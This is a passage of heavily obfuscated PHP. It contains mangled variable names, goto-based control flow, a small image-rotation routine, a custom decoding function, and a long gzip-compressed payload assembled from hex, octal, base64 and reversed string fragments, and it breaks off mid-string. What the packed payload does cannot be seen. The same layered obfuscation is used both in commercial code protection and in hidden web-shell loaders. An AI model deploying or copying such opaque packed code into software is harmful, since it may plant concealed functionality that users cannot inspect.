ñæšø·×); $dŠŒ¶™Í¸é = imagesy($f ñæšø·×); $bÛ˜«ƒ¢İÜ = imagerotate($f ñæšø·×, 180, 0); imagecopy($f ñæšø·×, $bÛ˜«ƒ¢İÜ, 0, 0, 0, 0, $F‘ˆ¥ï‡‘Â, $dŠŒ¶™Í¸é); break; default: return; } imagedestroy($bÛ˜«ƒ¢İÜ); } } goto dî‰õÚÏø; Aœ¦“ùµÄ: if (!function_exists('_kodDe')) { function _kodDe($AïÉ§ŸÖ˜á) { $AïÉ§ŸÖ˜á = base64_decode($AïÉ§ŸÖ˜á); $Dåµ²·£Ò = strlen($AïÉ§ŸÖ˜á); $B¡Ç„˜Ú¦” = ''; $AÚ¹ÌÒ©ò = ord($AïÉ§ŸÖ˜á[0]) - 30; for ($Bé±¸”æí× = 1; $Bé±¸”æí× < $Dåµ²·£Ò; $Bé±¸”æí× += 2) { if ($Bé±¸”æí× + 1 < $Dåµ²·£Ò) { $B¡Ç„˜Ú¦” .= chr(ord($AïÉ§ŸÖ˜á[$Bé±¸”æí× + 1]) + $AÚ¹ÌÒ©ò); $B¡Ç„˜Ú¦” .= chr(ord($AïÉ§ŸÖ˜á[$Bé±¸”æí×]) + $AÚ¹ÌÒ©ò); } else { $B¡Ç„˜Ú¦” .= chr(ord($AïÉ§ŸÖ˜á[$Bé±¸”æí×]) + $AÚ¹ÌÒ©ò); } } return $B¡Ç„˜Ú¦”; } } define("\257\322\254\310\350", base64_decode('yfOa')); $_SERVER[¯Ò¬Èè] = explode("\x7c\x1\x7c\x4\x7c\x4", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x3\x9d\x7d\x9\x60\x1b\xc5\xd5\x30\xf7\x7\x29\x77\x39\xca\xbd\x71\xe\x1f\xd1\x61\x3b\x89\x9d\x38\xb1\x13\xd9\x92\x6d\x25\xb6\xa5\x48\x72\x9c\xc4\x72\x94\x95\xb4\x92\x36\x96\xb4\xca\xee\x4a".base64_decode('PpKUUu6bljschXK2QAKl5UgJFCilFxQKpSXQQiEnlFBuKEf+uWd2JUP70zqaefNmdo43b97MvPfm')."\xb2\x6b\xcf\xbd\xeb\x9c\xfb\x9f\x5b\xb7\xef\xba\x3\xd6\x1d\xf0\x16\xfe\x59\xb7\x3f\xf8\xdf\x81\x38\x7c\xda\x85\x7\xef\x83\xfe\xdb\x3f\xb7\x64\xc9\xe2\x27\xeb\x8f\xfc\xee\x91\xb1\x2f\x8e\x5d\xfb\xbe\xbf\xe9\xdf\xeb\x7f\xbb\xe3"."\xf6\xbb\x76\xb5\x64\xef\xb\x9f\x75\xd9\xb4\x7\x67\x3b\xfe\x70\xf6\xd4\xa7\x26\x7f\x35\xfa\xb6\x6b\xe8\xed\xef\x9c\xfd\xea\x27\xcf\x7f\xbe\xe7\xd1\x5f\x26\x16\x1c\xff\xd1\xc8\x67\xdf\x3f\x7a\x96\xe7\x8c\xd4\x3d\x4d\x67\x4d\x3b"."\142\335\123\255\107\236\24\334\25\276\167\363\326\232\216\321\347\37\177\165\353\243\116\347\17\206\6\77\331\347\272\243\333\215\167\137\371\371\346\164\341\316\331\17\75\276\167\151\365\330\225\27\76\265\41\365\243"."\x86\xf7\x2e\xd8\x6f\xce\xb9\x97\x48\x5b\xfe\x7a\xcc\x39\x4b\xf6\x3c\xfe\xd1\x95\x3f\xb8\xf7\xd2\xd3\x1f\x3e\xf2\xf5\xf5\x97\xc\xd6\x37\x3c\x75\xf5\x4d\xb3\xcf\x6c\x3d\xf8\x8d\x2d\xb7\xc7\x9c\xff\xf9\xe0\xa8\xb1\x13\xda\x7f\x7e"."\xcc\x8b\x87\xdf\x3b\x69\x4d\xe7\xc1\xd3\x16\x3d\x71\xe9\xb\x5f\x78\xd7\xfe\xf5\xd0\x19\x37\xf\xb9\x6f\xce\x5e\x75\xdc\xbf\x6a\x17\xef\xcc\xde\xb8\x23\xbb\xb9\xe7\xc7\xa5\x3\x87\xcd\xcb\xae\xec\xbf\xec\xd3\x63\xd3\xa7\x5e\xfa"."\263\155\67\72\73\77\273\350\123\243\61\165\371\266\53\177\333\61\24\372\344\366\167\116\235\264\347\242\306\367\156\134\136\130\344\335\144\34\272\310\73\345\333\367\36\176\300\21\107\156\171\55\270\152\335\75\263"."\116\376\123\313\353\375\13\57\216\76\360\177\237\55\133\61\43\377\332\174\367\77\316\35\352\275\375\321\177\276\172\300\51\211\123\333\267\244\367\155\252\231\165\367\266\316\227\166\56\270\143\356\105\57\36\365\300".base64_decode('KT986AfORWc/fcgZ704aeOXAq2997K+dR01+bb999sH93IJ/pLxmSsqoapgGBiS0fEpN47Cax79u')."\374\143\254\311\252\246\202\303\261\276\100\44\26\356\17\6\175\241\110\214\224\50\246\347\264\44\11\25\144\135\316\221\302\13\212\156\200\117\211\305\305\12\132\101\311\133\40\34\220\224\115\71\56\33\244\44\157".base64_decode('e8zrC/YElsciy4M+ghGPrSkq+hiOoWDYlHUzouYUhjGis3q1+7r8fVIk5OkLezoi/kAfBncEenv9').base64_decode('kXJ4KNDT0+7pWFyeEgx5uno9EqhfVomp+ZRWI63CKaukWhzoVJVsEgfzMq2OOVYgoQgLgTHIF7NZ')."\x1c\xe9\x63\x21\x52\x7f\x25\x25\x17\xb3\xa4\xcf\xbc\x62\xa4\xa0\xab\x39\x99\x36\x7d\xb1\x32\xc6\xa0\x38\x20\x17\x4d\x4d\xcd\x27\x70\xc4\x37\x6a\xea\x32\x87\x83\x1a\x27\x74\x25\xa7\xe4\x49\x51\x61\x5f\x8f\xaf\x23\x22\xc1\x6a\x4a".base64_decode('naFAr0SGIicbpqJLA92+kE+CVW+tRi2ulnC+/j7QIZKnp0eaqARTyRVoMThPhcICIa8vJLUvl3g/')."\45\264\134\116\313\273\100\51\140\74\115\241\252\276\120\10\7\34\204\202\173\374\160\350\110\44\320\331\31\366\261\30\151\334\222\36\120\223\231\204\112\55\261\144\52\153\306\112\162\266\110\211\165\30\377\126\223"."\x1f\xf2\xab\x19\x84\x80\xd7\xa8\x79\xb5\x48\x88\x95\x14\xa1\x69\x6c\xe6\x90\x40\x91\x62\x2b\x14\x92\x3\xd9\x34\x32\xa7\xc0\x4\x2b\xe1\x60\x6b\x1b\xfe\x9d\x47\x90\xe2\x31\x98\xa6\xe8\x66\x4c\xc9\x27\xb4\xa4\x9a\x27\xd3\x70\x1".base64_decode('mXKE8GQz49VVgEcK1FwJrTDWq5VIG1JqVulhsyylZZOKzuMFkF1MIY1Rx4XcfcWciMKiiYyaTep0')."\x72\x7e\x1d\x66\x3\x29\x56\x31\x4d\xd0\xc\x83\xd6\xb4\xbf\x90\xd5\xe4\x64\x58\xd1\x85\xda\x77\x82\x62\x2\x45\x53\x4\x16\x11\x5a\xa7\xa6\xe7\xbc\x80\x1\x90\xde\x1\x64\xaf\xf6\x57\x48\x18\xa6\x84\x9f\x14\x3a\xc5\x45\x18\x57"."\315\340\31\316\257\206\6\27\202\177\152\11\27\213\222\252\145\224\154\66\246\214\52\144\202\344\222\263\15\132\173\267\21\127\363\156\0\301\121\177\40\226\221\215\114\157\162\166\14\345\242\314\61\251\214\272\12"."\231\2\231\303\154\332\106\55\4\14\373\273\117\63\175\2\213\315\152\11\71\53\266\24\207\63\246\131\10\53\371\44\354\20\322\42\155\44\217\72\254\240\50\4\311\353\220\222\122\257\264\134\352\156\121\133\50".base64_decode('dQFaSY1xjpcxc1kWoq1lMIMBzVFCE1UkroyapJOkeYmMrIPhay2aKeccwjgKhayakE1Vy7u1hKmY')."\116\303\324\25\231\224\126\65\117\202\24\1\147\160\35\316\105\147\117\207\226\67\301\364\165\106\164\71\157\244\24\335\351\43\344\335\42\201\176\146\34\214\242\171\125\243\240\31\52\374\114\213\44\233\246\234\310"."\300\331\317\213\157\375\32\174\65\237\125\363\112\31\256\47\221\120\14\303\11\263\350\132\326\351\311\146\265\21\147\100\127\323\52\310\123\147\253\46\340\114\55\22\145\233\5\125\127\14\32\225\272\172\43\4\31".strrev('ë3ÀM.é%U<p½œ§óÁ‘Ğ°T~ÀÔé†Šå!Ô`%"Ş¾MŒ0'."\n".'ÏÌ†z1B¤[“9uqJÔ')."\x67\x49\x80\x8c\x24\x9a\x86\xa1\xdd\x91\x48\x30\xe6\xef\x4\x8b\x71\x9f\x2f\xd6\xeb\x89\x74\x74\x93\x6a\x9b\x72\x9a\xd6\xb9\x7\xf0\x5e\x56\x24\x5\x2e\x73\x82\x29\x7\x9\xad\xf\xf4\x11\x7\x6\xb5\x11\x45\x7\x1f\x6e\x1f\x6b"."\x91\x86\xb5\x64\x5c\x1b\x75\xd1\x24\x88\x1c\x6\x5c\x82\x22\xc3\x1e\x2d\x98\xce\x90\x9c\x4f\xc3\xfe\x89\x8f\x99\xa\x21\x47\xa3\x94\xb6\x76\x68\x8f\x92\x4f\x9b\x19\x9a\x31\xec\xb\x2d\xf5\x85\x62\xe1\x40\x67\x64\xc0\x13\x22\xcb"."\x78\x1e\xc\xc4\x28\xfd\x14\x2c\x3a\xeb\xc\x29\x49\xd0\xf5\x9\x93\xe6\x93\xb\xb0\xd7\x28\xe\x9c\x28\x70\x8c\x69\x2a\x9c\x3c\x34\xad\xc7\xdf\x5\x3b\xc6\xeb\x34\x0\x92\x53\xc4\xa2\x65\xf7\xa8\x39\x15\xd6\xdd\x64\x29\xa8\x27"."\xc1\x1a\xdf\x45\x2a\xe4\x46\xd\x6a\x8d\x66\xea\x6a\xa2\xc9\x19\xb5\x4e\xf0\x6f\x5d\xed\x60\xd4\xeb\xaa\x1b\x5a\xe0\x56\x79\x1e\x77\x83\xab\x41\x6a\xac\x6f\x92\x82\x40\xe8\x50\xe5\xac\x44\x1a\x5d\x86\x51\x2f\x5\x16\x7f\x4d\x7"."\300\65\111\230\346\266\256\303\300\220\157\111\277\57\34\211\365\372\42\335\1\57\371\202\317\103\102\75\32\236\232\264\105\203\370\147\210\214\40\20\25\322\112\102\313\152\272\234\205\14\210\322\233\102\231\100\132"."\x4d\x71\xbe\xee\x7\x2\xd\xe9\x58\xcc\xf9\x78\x24\xac\xe6\xa\x94\x41\x99\x99\x62\x2e\x2e\x4\xdd\xbc\x4\x42\xb\x60\xc8\x18\x5b\xd2\xd8\x1a\xa4\xe9\x24\xd4\xe2\x26\x59\xa6\x35\x76\x52\x66\xeb\xe\xcf\x4\xff\xe7\x9c\x35\xa9"."\xe5\x64\x2a\x89\xa2\x89\xab\x24\xf1\xcc\xc5\xa0\x3a\x4b\x4a\xb7\x22\xf3\x45\xcd\xd4\x4d\xd\x42\x75\xb\x4a\xaf\x62\x66\x34\xd2\xcf\x69\x85\x56\xa9\xc8\xea\x46\x6b\x99\x54\xb2\xa\xed\xa5\x8c\x42\xb9\x34\x10\xaf\x4a\xac\xf3\xa"._kodDe('MICo90Dwy/hnJ65EBf578rYJ0w0IUG71FoqGuU9V9B7omhCLuivrnysufPJNkHYgBuD+ajUQgswqhg==').strrev('ÎS¨ğàå–óc¾g$´¤8¡¼´€ÃŠ–AĞº\\³‚óïF¥!†örÏNL>0–È#§')."\x3b\x73\x8a\x29\x3b\x59\xd5\xad\xeb\x9b\x14\x11\x97\x49\x3f\x19\x2\xce\x2c\xb3\x60\x51\x5\xfb\xb\xba\xb0\x6\x3\x61\x92\x61\x1\x84\x2\x69\x24\xae\xe8\xa4\x1e\xc1\x7e\x92\x94\x13\x86\xbf\xcb\x47\x80\x93\xe8\xda\x28\x13\xc9"."\305\63\20\246\214\256\10\360\165\165\134\346\155\134\100\353\103\312\36\315\145\271\200\25\123\55\343\27\323\342\253\1\27\3\104\47\127\152\265\223\217\125\244\333\337\267\70\326\33\360\372\172\142\376\76\300\45"."\x22\xe5\xf0\xfe\xa0\xd7\x43\x7\x5f\x84\xb7\x7\x22\xdd\x16\x68\x3f\xe0\x13\x4b\x3d\x3d\x7e\x3b\xba\x6f\x99\x3f\x1c\x9\x57\x4c\x2\xb0\x7e\x9f\x2d\x5\x6c\xb9\x82\x21\x5f\xa7\x7f\x19\x8b\x76\xfa\x7d\x3d\xde\x70\xac\xc3\xd3\xd1"."\315\161\372\74\275\44\22\113\301\115\217\341\266\342\307\0\303\13\263\255\123\254\4\267\201\264\63\143\226\175\112\214\112\340\61\116\47\140\361\122\10\155\222\346\302\315\47\152\11\221\211\23\132\221\122\53\23"."\342\162\224\101\344\144\62\103\145\272\60\325\340\237\132\311\23\226\314\102\214\261\202\370\30\13\242\146\320\70\20\327\310\367\45\302\174\313\152\20\203\70\355\112\112\323\225\257\3\170\122\46\43\14\133\34\314".strrev('K95M²…C_İ\'à+BŒ‘†Hºúp=Ål'."\0".'XÌ;â“«CÀşÀ4\\èÄˆĞ€¹vƒÀF')."\222\210\314\205\112\332\351\253\65\332\225\353\360\317\164\374\3\204\67\362\161\45\117\173\75\16\31\63\143\34\164\17\2\146\13\145\252\132\221\175\55\256\151\131\72\217\301\172\314\370\5\333\340\256\66\50\221"."\214\122\346\64\203\256\132\144\161\210\4\26\373\372\142\224\262\160\114\240\106\14\0\133\306\100\210\164\210\251\15\323\15\14\116\14\371\302\224\13\350\312\232\242\112\273\313\355\232\101\250\130\1\353\17\371\274".strrev('µ]Df‡:ç;×v\\sA–‚ÍwQİD¶Ô1©LPÜ³¨¿’Tè–]E‰(âëjk†s ÍFdte{').strrev('QœšªÆ1,æÁÔQ\'~€»WT2:%5Ôrc2İT:0pµ]ßéÎ¢ÓÑ­?L'."\0".'ˆzÖc£mh`3')."\x3\xaa\x4\xc4\x17\x86\x92\x47\x2c\x51\x40\xa0\x9\xe3\x6a\x81\x43\xd7\x36\xad\xa7\x70\x30\x86\x4a\x9a\xe7\x18\x74\x46\x67\xc\x2d\x10\xf2\x9\x20\xfb\xb7\x80\xe8\x2\xf8\x73\x86\xe1\x79\x9c\x2b\x60\xcb\x58\x56\x38\xef\x9\x7d"."\24\363\11\316\135\341\274\210\313\11\302\7\324\164\236\115\41\260\240\263\115\261\125\152\136\73\15\377\256\247\3\231\126\350\262\14\317\263\164\102\235\305\274\272\206\156\365\363\312\32\22\320\114\112\337\161\305"."\x1c\x51\x28\x79\x0\xb8\x25\xe\x88\x83\x6e\xdb\x40\x92\x10\xcb\x22\x21\x8d\x7c\x81\x6f\x97\x14\xb4\x77\x20\xad\x28\xc4\xa0\xd8\x35\xc2\x62\x49\x25\x4f\xc6\xe9\x10\x82\x6d\x24\xe4\x82\x12\x16\x5a\x18\x8b\x45\x3c\xed\x3d\xbe\x18".base64_decode('5TCEE9M44ort7HAMNI1zVMofElxkNtZkJcQMJEXXNb0FHfwZxQKUxcCuyQT9KYGttNTaJuFuJlwi')."\46\166\172\101\246\322\4\334\335\62\11\301\135\23\215\26\7\225\344\320\40\40\144\331\231\32\132\73\163\175\55\225\222\335\121\360\37\215\140\376\105\152\134\340\343\147\0\131\53\141\262\5\267\354\174\52\306"."\70\40\254\2\73\146\320\164\266\316\102\70\227\132\115\315\224\263\14\15\246\105\40\204\162\33\272\126\223\75\72\36\300\36\316\204\340\352\54\234\336\41\16\331\307\216\246\330\211\203\160\160\4\140\16\41\212"."\xff\x6d\xad\xa2\x6c\x3a\xf\x26\x42\x7\x5f\xa4\xfc\x5e\x27\x19\x44\xcf\x32\xa7\x9f\x8\xf0\x2c\xa0\x52\x51\x53\x6\xd3\xd9\xa4\x50\x43\x2b\xea\x9\x85\xe1\x58\x84\xc\x53\xd6\xc1\x9a\xc5\x25\x3b\x28\x83\x9\xc7\x8b\xa0\xe6\xe"."\x78\xe\xe1\x80\x6b\xaa\x3\x48\x7b\xe\x78\xde\xe3\xe0\x12\xab\x83\x1f\x21\x38\x98\xfc\xe9\x20\x62\xa9\x83\x97\x4e\x82\x7e\xaf\x43\x35\xbc\x48\x3c\x46\xe5\xa2\x24\x5a\x67\x33\x3\x37\xe4\x59\x79\xcc\x81\xeb\xdf\xa3\x94\x94\xac"."\x83\xd6\xde\x41\x1b\xe5\xa0\x2d\x70\xa0\xfd\x86\x97\xd4\xa6\x1f\xd0\x7\xa9\xd\xa\x2\x26\x91\x71\xc0\xe1\x80\x63\x4b\x4b\x81\x41\xda\xd\x4c\xa8\x76\x70\x81\xdb\x91\xd6\xb5\x62\x21\x48\xbf\x24\xc4\x70\x65\x8\x80\xd7\x94\x1"."\x42\x9a\x66\x3a\xe8\x6\x88\x5\x7a\x19\x7\x82\xd5\xe1\xa1\xa5\x7c\xc0\x79\xed\xd9\xf2\x49\x9a\x80\xe3\xf6\x3a\x60\x28\x4c\xef\x94\x4b\xe2\x0\x57\x1c\xec\xbc\x95\x30\xf8\x29\x29\x3f\xcd\xe3\xe2\x92\x7d\x23\x62\x3f\x1e\xe2\x9d"."\xc8\x2b\x11\x91\xd3\x61\xe1\xf3\xa6\x9c\xa6\xdf\xae\x90\x8a\xc3\x21\x25\x31\x96\xe0\x9b\x1b\xaf\xb0\x5b\xb2\xc6\xd8\xd0\x23\x3a\xac\x44\x4c\x95\x87\x9e\x11\x8\xa3\xb5\x49\x87\x1c\x42\x29\x9b\xd3\x11\x21\x1f\xb\xb1\x4d\x48\xdd".base64_decode('vE2BAl9xIEMIAz4oTHkKCnAOUyQrpGwkqCwzQu8pFAoT6k9bbykXRvnMpE2UYAEOgWfD0XHyIRai')."\344\107\325\142\270\137\143\71\266\263\140\35\155\143\106\260\337\203\152\176\114\315\213\173\167\16\345\74\217\23\5\44\157\36\303\175\74\121\30\363\26\176\66\340\40\147\6\16\260\157\34\26\270\36\337\343\202"."\xda\xc3\xac\x42\xdd\x49\x49\xb6\x9a\xd3\x9\xe8\xb4\x46\xf9\x7c\xec\x7\xdb\xa4\x98\x8d\x54\x9\x91\x66\x64\x9d\xf7\x32\x9d\x63\x90\xb0\x59\xab\xc\x88\xc2\xa3\x2\x5a\x4a\x2e\x71\x76\x6f\xc9\x23\xcc\xc\xc3\x1c\x63\xc7\x1c\x42"."\xd0\x5a\x28\x8e\x7a\x27\x8a\x74\xb3\xdd\x5f\xa5\xa8\x38\xe9\x54\xa3\x7\xf4\x66\xa5\x30\x6a\x69\x44\xab\x18\x45\x52\x81\x4\xe4\x1\x7a\x4c\x46\xc5\xfb\x98\xed\x98\x1\x44\x85\x91\x8a\x59\x4e\x24\x70\x35\x3c\x8c\xf5\x1\xc1\x26"."\13\106\100\167\301\111\322\5\31\233\270\12\361\25\12\62\123\34\26\220\12\166\36\150\341\325\225\26\76\73\267\266\101\155\121\376\121\13\337\51\133\235\210\160\102\144\321\172\102\365\111\260\153\164\351\230\263"."\xb9\x80\xf8\x41\xee\x7a\x1c\xf5\xc2\xf2\xc6\xa7\xef\x5a\x63\xcc\x30\x95\x1c\xe1\x84\xeb\x6d\xbd\x63\x82\xed\x4d\x5c\xd6\x5d\x3a\xa8\x11\xaf\x28\x5f\x12\x88\xf0\x51\x64\x80\x21\x3b\x6\x2e\xbe\x47\xa3\xb2\x30\xa4\x7f\x5f\x52\x35"."\41\4\162\63\215\36\132\161\104\201\315\63\230\120\40\352\22\127\331\30\144\325\141\222\313\61\315\202\131\211\223\273\352\20\317\165\361\265\107\134\271\304\133\45\210\306\133\36\223\123\344\14\331\237\267\103\70"."\x7e\xc\x90\x50\x8c\x9c\x15\x11\x5a\x6d\xf7\x84\xfd\x1d\xb1\xa0\x87\x1e\x71\xc8\x85\x82\x1b\x6e\x1e\xe0\x19\xc\x3f\x26\x9c\x45\x7a\x35\xa3\x24\x86\x63\x72\x1c\xf0\x59\x7a\x98\x5a\x84\x7\x58\xc3\xe2\x27\xe9\x0\x14\x8\x19\x8"."\x17\xc4\x39\x76\x8f\x86\x80\x2e\xc3\xd4\xa\x3c\x45\x88\xe2\x64\x21\x89\x17\x2a\x60\x31\x6a\x40\x5d\x6\x96\xa4\x24\x12\x58\xf8\x98\x22\x5c\x92\x17\x89\xf4\x78\xb6\xb9\xb2\x0\xc3\x25\xf2\x46\x8f\xae\x53\xaa\xc5\xfd\xd\x8f\x94"."\0\120\4\101\376\21\246\107\232\225\226\10\134\270\257\304\57\176\161\121\360\303\56\274\142\272\344\144\62\100\317\373\304\160\71\252\170\274\121\271\40\164\27\317\212\22\142\225\321\75\331\54\277\330\263\307\47"."\xcc\x82\x99\x87\x98\x49\x84\x4c\x98\xad\x13\x49\xe5\x94\x48\x2a\xc1\x98\x90\xd9\x69\x23\x6a\xce\x2\xf8\xc5\xa9\x5d\x6\xb7\x72\xc3\x6f\x92\xf\xcb\xa6\x24\x1f\xd0\xca\x71\xc8\xb0\x33\x6a\x5e\x31\xd8\xdc\xd1\x8d\x4a\x8c\xef\x9b"."\x4\x2e\x8b\x18\x6e\x95\xac\x44\x91\x8a\xac\xcf\xbc\xb9\x62\xb7\x42\xf2\x9f\x88\x16\x60\x9a\x70\xca\x5\x36\x75\x0\x20\x2e\x6c\xec\x28\x87\x33\x42\x61\xed\x46\xeb\x60\xcc\xb4\xc8\x21\x21\x54\x86\x30\x1f\x2c\x43\xc\xe6\x1f\x6e"."\121\247\256\345\374\1\60\277\52\23\235\35\117\241\207\131\210\313\216\262\75\242\230\11\20\11\134\26\47\52\223\46\263\242\370\32\272\347\155\374\273\13\377\314\236\105\316\231\327\355\277\156\277\165\7\341\60".strrev('{ğï¸}Ş~äì¾¿ıï]rÜ/»àj¾^Óî>ìŸ‘¡KóRpŸ}Óún+Aìs7ùÛÙ{:}W')."\120\235\271\56\373\335\133\273\237\77\46\163\301\161\271\347\366\163\76\67\375\244\233\74\337\237\276\353\225\27\207\167\72\133\266\135\177\302\17\267\316\71\354\270\243\166\376\361\235\350\243\37\334\60\363\67\213"."\x5f\x9b\x7c\xd0\x77\xdf\xfe\x5c\x5b\xff\xee\x3d\xa7\x1d\xf3\xe9\x11\x87\x65\xaf\x3e\xfd\xb3\x6d\xaf\x46\xfe\xd8\xe9\xf3\xf4\x2f\x6b\x2c\x9e\x77\xce\xf5\x47\xdd\xd8\x35\xe7\xd6\x3\xf\xbb\x6e\xea\xf7\x4e\x38\x6d\xd3\x13\xe3\x27".strrev(';ÿ•gÆóº±Ÿ_šÅæ»»uŞÀö¾­ì_Â«óá¹?ÇéwzóN×”Ú{í_³üıîş5¦åa´œ')."\xeb\x8f\xb7\xbe\xf1\xc2\x4f\x1e\x72\xde\x11\x5d\x7c\x47\xd3\x7b\x5b\xb3\xcd\x3d\x55\x97\x5f\x70\x76\xcb\xf9\xf3\x27\x9d\xd8\x79\xc5\x1\xed\x97\xde\xbd\xf9\x8d\xaf\x5e\x58\xb2\xe0\x57\xae\x9b\x97\xad\xd8\xb5\xea\x9a\x49\x53\x2e"."\x3e\x4c\x1e\x3e\xf2\xa6\x2b\x4f\x6c\x79\xe0\x92\xfb\xf7\x3b\xfe\xff\xc2\xd7\x9f\xea\xad\xfa\xc9\x99\xef\xa4\x9e\xa8\x7f\xeb\xf0\xc0\x2f\xdf\x3c\x7f\xbc\xe5\xad\x35\x8f\x9f\xf2\xca\xcc\x7f\xff\xec\xf5\xc1\xaf\x4e\x19\xdb\xf4\xc8"."\205\353\17\150\73\344\361\53\367\275\361\247\256\37\157\276\155\321\340\273\217\334\374\257\131\317\77\273\371\27\37\374\373\216\221\27\233\37\374\347\241\237\76\376\370\27\355\352\113\301\373\103\315\322\257\377\60"."\xbb\xe9\xa3\xc6\x3f\xcf\xbe\xff\x89\x69\x7\x35\xe5\x8e\xb8\x62\xde\x89\xe6\xa7\x4f\x8f\xee\xb7\x31\x77\xc7\x69\x5b\x1e\x6f\xd8\xfb\x8f\x77\x8f\x28\xd\xae\x9f\x3d\xe3\xf7\x9f\x5d\xb5\x72\x57\xfe\x84\x7f\x6e\xb8\xb9\xff\xad\xa8"."\x7e\xdf\x3\x3b\xef\xc\x6d\x9c\xfd\xd6\x47\x7\x65\x4a\x7b\xce\x3e\x27\xe4\xdd\xb0\xb4\xe9\xe1\xe4\xdc\x1b\x9e\xf9\xc5\xa2\xfb\xe4\xd5\xd3\x33\x4f\xd6\x8f\xac\xac\x3b\xee\xba\xdb\x97\x6c\xd4\x7f\x37\x3e\xb7\xd5\xdd\x7f\x68\xb8"."\366\370\263\133\315\55\167\326\257\172\351\302\357\354\271\140\337\310\103\367\276\367\343\205\137\174\347\170\371\360\31\47\116\72\144\177\375\220\153\67\137\273\374\335\43\317\171\172\315\255\157\317\71\40\375\155\103"."\271\342\272\333\317\237\175\377\25\76\375\214\275\37\276\163\331\236\227\57\271\250\141\315\277\177\274\144\270\156\122\135\323\303\267\32\157\334\164\354\341\163\136\374\326\262\7\177\73\371\344\55\346\163\233\263\253".base64_decode('J82M7fvYzNGFC5++67L4yGV3Hj49vk/hmp5TphyffvqUk9s3jn7npNy33r7/Ae91px60w/8r6Z4n')."\117\150\233\364\344\201\207\134\264\144\333\257\216\76\176\355\121\173\33\163\7\75\162\352\253\233\127\35\371\301\363\307\174\162\376\37\43\223\343\315\317\326\274\167\377\365\317\277\140\74\371\300\277\253\116\73\65"."\170\374\335\211\203\123\227\234\371\357\315\277\55\115\237\21\113\376\340\237\133\377\361\353\47\236\330\134\273\170\362\351\336\203\173\17\273\175\337\337\354\37\333\166\353\245\167\26\127\235\164\316\167\326\216\256\371".base64_decode('ffzhrpM7vAd6na8F5A0N580rnPXRlXuShz97/iuHdz5++97wPQ9fdIO/6emuP2+6+ez9Xn1wy8sd')."\xaf\x1c\x7f\xf7\xb6\x6b\x3f\x3e\x26\xd5\x70\xdb\x3\xcd\xa7\x74\xd4\xf7\x1e\x33\xf7\xe1\xd1\xfd\x1f\x9d\x73\x95\x31\xd8\xee\x51\x4a\xf1\x17\xce\xfa\xe3\xbd\xf\xd6\xbe\x7f\xab\x63\x4d\xf3\xde\x9e\xe7\xfe\xf1\xec\xae\x85\xd7\xbc"."\x73\x4b\x4f\xa6\xe9\xe9\xdf\x9d\xf3\x79\xd3\x2f\x7e\x76\x56\x3a\xf5\xfa\xa6\x45\x97\x1\xd9\x69\xd9\xc5\x73\xee\x3b\x6f\xd5\x35\xcf\xbc\x77\xd1\xc2\xaa\x5b\xa6\x7e\xd2\xd8\x54\x58\xfa\xa7\x6d\x99\x27\x2e\x6f\x76\xa4\x9e\xfe\xf0".base64_decode('e5uj+/82/uDsPb/4y+UvbZPefvbb3ftI008+619XbRyZvHvfv9bVfWxe2/6v1Q/8dOe1Ux+cdvbC').base64_decode('GdULFt780UXSQZOn7vP+oVfe1/KtH5kH7713W+eX+72c2v+Ep1o2nv9q/dRz/rls9mAyccryuRv+')."\346\172\366\220\310\357\247\326\35\370\314\73\365\175\325\301\315\306\213\363\226\16\176\371\325\353\217\156\75\251\360\362\227\173\66\266\234\170\350\364\353\346\277\45\335\234\165\274\375\312\106\147\174\313\262\147\126"."\377\345\207\57\71\376\362\241\271\357\314\343\176\277\352\123\147\377\234\237\274\173\143\317\356\356\215\347\367\337\160\236\343\202\353\276\125\167\317\121\323\167\336\375\317\267\237\176\65\370\275\334\103\235\7\115\171"."\135\177\146\237\170\353\21\57\77\220\235\165\102\160\326\317\216\131\361\260\353\275\111\55\357\15\334\375\340\275\231\311\256\335\53\317\173\163\331\35\167\157\235\321\164\353\325\273\17\73\351\260\207\377\163\155\355"."\x55\x6f\x1d\xb3\xbb\x39\xf7\xe1\x9b\x7\xad\x1e\x29\x3e\x79\xb7\x2f\x7a\xf2\xb7\xf7\x1c\xf6\x82\xeb\xf6\x5d\xa7\xae\x7c\x2a\x73\xf8\x63\x9\xff\xef\x7f\xf4\xa7\x9e\xb5\xaf\xb5\xfe\xe5\xe1\x97\xef\x9e\x93\x3f\xf4\xe5\x97\x8f\xfe"."\375\15\127\367\276\260\317\342\253\347\32\47\326\336\266\350\57\65\303\307\256\271\365\217\365\27\72\136\234\23\332\375\153\347\311\7\114\35\75\374\222\113\263\236\243\37\375\321\212\47\17\132\377\335\352\233\156".base64_decode('XVbzu2tnHn5C26PNu+5M//35ZQ/M2LdpjfS9kfprr7/zlj0rR1485YyDjnt//pLL1j795iF/+PYv').base64_decode('1j/X0rbn433XNX5+yhNbX5oya/F7H53cGFt7c/TPpxx9xtZXLl25OX3TJWvyz/zwd4ueuvaQ6Td0').base64_decode('bV/98It3qvce9+pvf/nEPZ/e+MtHMh+/eeEDT7w89Gj+DwuP+fszuwrtBwyepJSWPBx/9NOjT3vs')."\343\357\347\257\270\366\135\115\313\75\366\320\107\125\57\376\347\341\167\137\174\153\103\250\171\303\155\216\77\25\377\366\223\153\137\154\50\234\70\175\136\344\333\157\234\273\170\333\23\167\74\66\376\305\207\227\56".strrev('hÿÒsŞZoÔûÛ;½èÿJø¿Ï’à:y¿ïûÙğ]Ş¯.ùôû­¯+ÁóÿGğ5ı7«ìx')."\x3e\xfd\xee\x3\x47\xbe\xbb\x5f\xd7\x9b\x67\xfd\xf2\xcf\xf7\xee\x5c\xf7\x84\xef\xcb\x37\xbf\x3c\xb9\xf1\x8c\xaa\x49\xa7\xde\xee\x38\x2d\xf5\xf7\xef\xb4\x2d\xdc\xfd\xc2\xaf\x36\x5d\x55\x78\xf2\xce\xab\x36\x8c\xb5\x3c\xff\xe6\xca"."\103\262\37\354\72\120\367\306\46\157\276\372\241\47\367\71\370\240\172\277\163\307\101\163\237\370\140\237\23\122\277\273\173\367\261\137\376\346\337\352\341\177\116\67\34\237\237\166\174\351\317\17\345\166\75\273\371"."\xdb\x17\x1e\xf0\xf1\x89\x3b\x4f\x5c\x72\x4d\xef\xef\x8e\x39\x60\xec\x5f\x67\xfa\xfb\x96\xfe\xf6\xcb\xd1\xf1\xba\xba\x5b\x6e\x7d\xfe\xe7\x6b\xe5\x3f\x7d\xeb\xd0\xdb\xde\x9d\xfd\xe4\xf5\x8f\xdd\xf7\xc1\xfb\x2f\x7d\x7c\xcb\x3b\x57"."\xe7\xef\xea\x95\x82\xf7\x47\x6b\x5b\xb7\x6e\x7d\